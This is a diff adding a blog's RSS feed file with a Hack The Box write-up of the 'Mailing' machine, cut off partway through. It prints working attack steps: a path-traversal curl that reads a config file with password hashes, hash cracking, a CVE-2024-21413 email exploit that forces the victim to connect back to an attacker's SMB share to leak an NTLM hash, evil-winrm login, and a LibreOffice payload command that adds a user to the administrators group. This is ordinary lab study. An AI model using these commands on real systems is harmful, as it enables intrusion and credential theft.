@@ -1,0 +1,1789 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>The Pond</title>
+    <description>SecOps and HTB Write Ups</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sat, 14 Sep 2024 13:39:08 -0400</pubDate>
+    <lastBuildDate>Sat, 14 Sep 2024 13:39:08 -0400</lastBuildDate>
+    <generator>Jekyll v4.3.3</generator>
+    
+      <item>
+        <title>Mailing</title>
+        <description>&lt;div class=&quot;heading-wrapper&quot;&gt;
+    &lt;h1 class=&quot;heading&quot; id=&quot;Recon&quot;&gt;Reconnaissance:&lt;/h1&gt;
+    &lt;h2&gt;&lt;i class=&quot;fa-brands fa-rust fa-sm&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; Rust Scan &lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|  &lt;span class=&quot;sb&quot;&gt;`| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`&lt;/span&gt;-&apos; &lt;span class=&quot;sb&quot;&gt;`-&apos;`&lt;/span&gt;-----&apos;&lt;span class=&quot;sb&quot;&gt;`----&apos;  `&lt;/span&gt;-&apos;  &lt;span class=&quot;sb&quot;&gt;`----&apos;  `&lt;/span&gt;---&apos; &lt;span class=&quot;sb&quot;&gt;`-&apos;  `&lt;/span&gt;-&apos;&lt;span class=&quot;sb&quot;&gt;`-&apos; `&lt;/span&gt;-&apos;
+The Modern Day Port Scanner.
+&lt;span class=&quot;gs&quot;&gt;________________________________________&lt;/span&gt;
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+&lt;span class=&quot;p&quot;&gt; --------------------------------------&lt;/span&gt;
+To scan or not to scan? That is the question.
+
+Open 10.129.39.59:25
+Open 10.129.39.59:80
+Open 10.129.39.59:110
+Open 10.129.39.59:135
+Open 10.129.39.59:143
+Open 10.129.39.59:139
+Open 10.129.39.59:465
+Open 10.129.39.59:445
+Open 10.129.39.59:587
+Open 10.129.39.59:993
+Open 10.129.39.59:5040
+Open 10.129.39.59:5985
+Open 10.129.39.59:7680
+Open 10.129.39.59:47001
+Open 10.129.39.59:49664
+Open 10.129.39.59:49665
+Open 10.129.39.59:49667
+Open 10.129.39.59:49666
+Open 10.129.39.59:49668
+Open 10.129.39.59:55705
+[~] Starting Script(s)
+[&amp;gt;] Running script &quot;nmap -vvv -p   sC -sV -A&quot; on ip 10.129.39.59
+Scanning 10.129.39.59 [20 ports]
+Discovered open port 80/tcp on 10.129.39.59
+Discovered open port 993/tcp on 10.129.39.59
+Discovered open port 135/tcp on 10.129.39.59
+Discovered open port 139/tcp on 10.129.39.59
+Discovered open port 587/tcp on 10.129.39.59
+Discovered open port 7680/tcp on 10.129.39.59
+Discovered open port 143/tcp on 10.129.39.59
+Discovered open port 110/tcp on 10.129.39.59
+Discovered open port 445/tcp on 10.129.39.59
+Discovered open port 25/tcp on 10.129.39.59
+Discovered open port 465/tcp on 10.129.39.59
+Discovered open port 49664/tcp on 10.129.39.59
+Discovered open port 47001/tcp on 10.129.39.59
+Discovered open port 55705/tcp on 10.129.39.59
+Discovered open port 5985/tcp on 10.129.39.59
+Discovered open port 49666/tcp on 10.129.39.59
+Discovered open port 49668/tcp on 10.129.39.59
+Discovered open port 49665/tcp on 10.129.39.59
+Discovered open port 5040/tcp on 10.129.39.59
+Discovered open port 49667/tcp on 10.129.39.59
+Completed SYN Stealth Scan at 08:24, 0.04s elapsed (20 total ports)
+
+PORT      STATE SERVICE       REASON          VERSION
+25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Did not follow redirect to http://mailing.htb
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+110/tcp   open  pop3          syn-ack ttl 127 hMailServer pop3d
+|_pop3-capabilities: USER UIDL TOP
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+143/tcp   open  imap          syn-ack ttl 127 hMailServer imapd
+|_imap-capabilities: OK IMAP4rev1 ACL IDLE QUOTA NAMESPACE CHILDREN IMAP4 SORT completed CAPABILITY RIGHTS=texkA0001
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+465/tcp   open  ssl/smtp      syn-ack ttl 127 hMailServer smtpd
+--SNIP--
+587/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+--SNIP--
+|_ssl-date: TLS randomness does not represent time
+993/tcp   open  ssl/imap      syn-ack ttl 127 hMailServer imapd
+--SNIP--
+5040/tcp  open  unknown       syn-ack ttl 127
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7680/tcp  open  pando-pub?    syn-ack ttl 127
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+55705/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=258 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 25942/tcp): CLEAN (Timeout)
+|   Check 2 (port 53596/tcp): CLEAN (Timeout)
+|   Check 3 (port 59027/udp): CLEAN (Timeout)
+|   Check 4 (port 48605/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2024-08-29T13:27:31
+|_  start_date: N/A
+|_clock-skew: 0s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;/div&gt;
+
+&lt;p&gt;There is a lot of open ports on this box. Some noteworthy highlights are the following ports:&lt;/p&gt;
+&lt;h2 id=&quot;ports&quot;&gt;Ports:&lt;/h2&gt;
+&lt;ul class=&quot;checklist&quot;&gt;
+&lt;li&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; 25, 110, 143 - SMTP,IMAP and POP3. All mailing server ports. Appears to be some sort of mailing service setup on the box. We can see in our rust scan there is a service running &lt;code&gt;hMailServer&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; 139, 445 - SMB Ports. There is SMB opened on this box.&lt;/li&gt;
+&lt;li&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; 80 - There is a website running.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;ffufing&quot;&gt;FFUFing:&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;I didnt discover much with fuzzing. Lets see if I can find anything with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wapiti3&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;wapiti3&quot;&gt;Wapiti3:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wapiti3&lt;/code&gt; on our target we get an instant hit with &lt;mark&gt;`LFI`&lt;/mark&gt; on the &lt;mark&gt;`/downloads`&lt;/mark&gt; path.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_Wapiti3_LFI.png&quot; class=&quot;resize2&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Curling down the path gives us proof that it indeed is vulnerable.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;curl &quot;http://mailing.htb/download.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We know we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hMailServer&lt;/code&gt; installed so lets see if we can find anything in that folder with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LFI&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;-lfi&quot;&gt;&lt;i class=&quot;fa-solid fa-file fa-xs&quot; style=&quot;color: #c061cb;&quot;&gt;&lt;/i&gt; LFI:&lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;curl &quot;http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Poking around we find a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.INI&lt;/code&gt; file that contains setup information for the server.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
+[Database]
+Type=MSSQLCE
+Username=
+Password=0a9f8ad8bf896b501dde74f08efd7e4c
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Appears to be a md5 hash for a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AdministratorPassword&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-seedling fa-lg&quot; style=&quot;color: #98971a&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;841bb5acfa6779ae432fd7a4e6600ba7&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Save this hash to a file and run hashcat with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; word list on it.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt; hashcat -m 0 hash /usr/share/wordlists/rockyou.txt &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We successfully crack the hash with the password of:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-seedling fa-lg&quot; style=&quot;color: #98971a&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;homenetworkingadministrator&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_HashCat_MailServer.png&quot; class=&quot;resize&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Attempting to crack the second password
+  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0a9f8ad8bf896b501dde74f08efd7e4c&lt;/code&gt; is proving to be more difficult.&lt;/li&gt;
+  &lt;li&gt;Im unable to crack it in hashcat but we did find a specific tool just for this case.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://github.com/GitMirar/hMailDatabasePasswordDecrypter&quot;&gt; hMailServer Pass Cracker&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; Decrypting the password with this tool gives us &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6FC6F69152AD&lt;/code&gt;. Though Im not sure what to do with it at this moment.&lt;/p&gt;
+
+&lt;h2 id=&quot;-port-connections&quot;&gt;&lt;i class=&quot;fa-solid fa-network-wired fa-sm&quot; style=&quot;color: #b8bb26&quot;&gt;&lt;/i&gt; Port Connections:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Now that we have some creds lets see if we can connect to any of these ports with some generic admin/administrator usernames.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet boxIP 110
+USER administrator@mailing.htb  
+PASS homenetworkingadministrator  
+LIST  
+RETR 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We get some luck with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator@mailing.htb&lt;/code&gt; using the administrator password. But it appears theres nothing in the mailbox.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_POP3_1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Going back to the website we can see a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;download instructions&lt;/code&gt; button at the bottom of the screen. It leads to a PDF you can download with instructions on how to connect to the mail server.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://mailing.htb/download.php?file=instructions.pdf&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;-thunderbird&quot;&gt;&lt;i class=&quot;fa-solid fa-envelope-open-text fa-xs&quot; style=&quot;color: #d65d0e;&quot;&gt;&lt;/i&gt; Thunderbird:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Lets follow the instructions and setup &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thunderbird&lt;/code&gt; on our Linux box to connect to the mailbox.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Using the found credentials for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator : homenetworkingadministrator&lt;/code&gt; lets sign into the mailbox.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_IMAP_Thunderbird.png&quot; class=&quot;resize&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We successfully login with this account.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_Thunderbird_Login_Success.png&quot; class=&quot;resize2&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;emailing&quot;&gt;Emailing:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;instructions PDF&lt;/code&gt; we notice at the end we are to email &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maya@mailing.htb&lt;/code&gt; to get a response from them. This is hinting at a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;responder attack&lt;/code&gt;. Lets see where it goes.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Email &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maya@mailing.htb&lt;/code&gt;:&lt;/p&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My first email!
+Hi Maya! This is my first mail.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_Maya_Email.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;I waited around for awhile but never got a reply email. I have a sneaking suspicion they want us to setup &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;responder&lt;/code&gt; and catch the reply back. Lets see if we can get any hits. We probably need to send a malicious email that will cause Maya to reach back to our server.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;-cve-2024-21413&quot;&gt;&lt;i class=&quot;fa-solid fa-user-secret&quot; style=&quot;color: #fb4934&quot;&gt;&lt;/i&gt; CVE-2024-21413:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Looking around for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hMailServer / outlook &lt;/code&gt; vulnerabilities we stumble across a recent cve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cve-2024-21413&lt;/code&gt; that looks promising.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6&quot;&gt;https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6&lt;/a&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://github.com/CMNatic/CVE-2024-21413&quot;&gt;https://github.com/CMNatic/CVE-2024-21413&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We can use this CVE to send a bad email to Maya in hopes that when she clicks on the email it will cause them to reach back out to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB server&lt;/code&gt; we have setup and we can catch that information on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;responder&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo impacket-smbserver smbFolder $(pwd) -smb2support
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Then send your email with your SMB share for Maya to reach back out to.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url &apos;\\&amp;lt;boxip&amp;gt;\SMBSHARE&apos; --subject XD
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;MAYA::MAILING:95de498996a31a8c:d2babc773ff653ee285d33e6fe5493a6:010100000000000080f2298488b6da015d1dcbb264e2490c0000000002000800530059005500490001001e00570049004e002d005a004f0042005000340036004d0038004b005600410004003400570049004e002d005a004f0042005000340036004d0038004b00560041002e0053005900550049002e004c004f00430041004c000300140053005900550049002e004c004f00430041004c000500140053005900550049002e004c004f00430041004c000700080080f2298488b6da0106000400020000000800300030000000000000000000000000200000c9e5bc0c7d84e948e12cf5d180e24c511c66b448ef8db310790edb6ad72669ff0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00370031000000000000000000:m4y4ngs4ri&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We capture this NTLM hash from responder.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;-evil-winrm&quot;&gt;&lt;i class=&quot;fa-solid fa-meteor fa-sm&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; Evil-WinRm:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;We managed to dump a NTLM hash cred for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maya&lt;/code&gt;.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-seedling&quot; style=&quot;color: #98971a;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m4y4ngs4ri&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; We can use this to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; onto the box and get our foothold&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm -i mailing.htb -u maya -p &apos;m4y4ngs4ri&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cd to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Desktop&lt;/code&gt; for the user flag.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_Maya_Foothold.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Exploring around we find an interesting app installed in &lt;mark&gt;`Program Files`&lt;/mark&gt;.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibreOffice&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_LibreOFfice.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;After running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winPEAS&lt;/code&gt; and not having much luck seeing any attack vector I was looking for vulnerable applications.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;libre-office&quot;&gt;Libre Office:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Looking at the &lt;mark&gt;`readme`&lt;/mark&gt; files inside the application we can find out that the version installed is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7.4&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_LibreOffice_Version.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;-cve-2023-2255&quot;&gt;&lt;i class=&quot;fa-solid fa-user-secret&quot; style=&quot;color: #fb4934&quot;&gt;&lt;/i&gt; CVE-2023-2255:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;We discover a cve related to this version of Libre Office.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://www.libreoffice.org/about-us/security/advisories/CVE-2023-2255&quot;&gt;https://www.libreoffice.org/about-us/security/advisories/CVE-2023-2255&lt;/a&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://github.com/elweth-sec/CVE-2023-2255&quot;&gt;https://github.com/elweth-sec/CVE-2023-2255&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We can escalate our local privileges to administrator using this exploit. Lets Proceed with attempts.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;libre-office-exploiting&quot;&gt;Libre Office Exploiting:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;In affected versions of LibreOffice these floating frames fetch and display their linked document without prompt on loading the host document. Essentially you can load &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote files&lt;/code&gt; without the user being prompted that a file is being loaded.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; We can use this PoC to generate a malicious payload to execute and gain us administrator access.&lt;/p&gt;
+
+    &lt;p&gt;&lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; https://github.com/elweth-sec/CVE-2023-2255.git&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;malicious-payload&quot;&gt;Malicious Payload:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Use the PoC to make a bad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.odt&lt;/code&gt; file that injects the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt; to add maya to local &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administradores&lt;/code&gt; group.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 CVE-2023-2255.py  --cmd &apos;net localgroup Administradores maya /add&apos; --output &apos;exploit.odt&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Mailing/Mailing_ODT_File_Create.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Now that we crafted the payload we need to upload it to the victim. There is a suspicious &lt;mark&gt;`Important Documents`&lt;/mark&gt; directory in &lt;mark&gt;`C:\`&lt;/mark&gt; with nothing inside it. Lets upload it there.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Lets check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maya&lt;/code&gt;’s privileges before hand.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
